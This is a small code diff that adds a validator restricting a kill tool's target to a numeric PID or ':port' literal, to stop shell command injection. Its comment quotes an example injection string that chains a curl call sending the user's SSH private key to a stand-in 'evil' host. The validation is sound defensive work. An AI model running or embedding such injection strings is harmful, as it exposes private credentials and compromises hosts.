@@ -18,3 +18,11 @@ export function parseKillArgs(argv) {
   }
   return { target: args[0], sig };
 }
+
+/** A kill target MUST be a bare PID (digits) or a `:port` literal — nothing else. The
+ *  tool interpolates it UNQUOTED into a bash command (`kill -SIG <target>`), so an
+ *  arbitrary string like `1; curl http://evil/$(cat ~/.ssh/id_rsa)` would be host
+ *  command injection. The schema only enforces a non-empty string, so validate here. */
+export function isValidKillTarget(target) {
+  return typeof target === "string" && (/^\d+$/.test(target) || /^:\d+$/.test(target));
+}
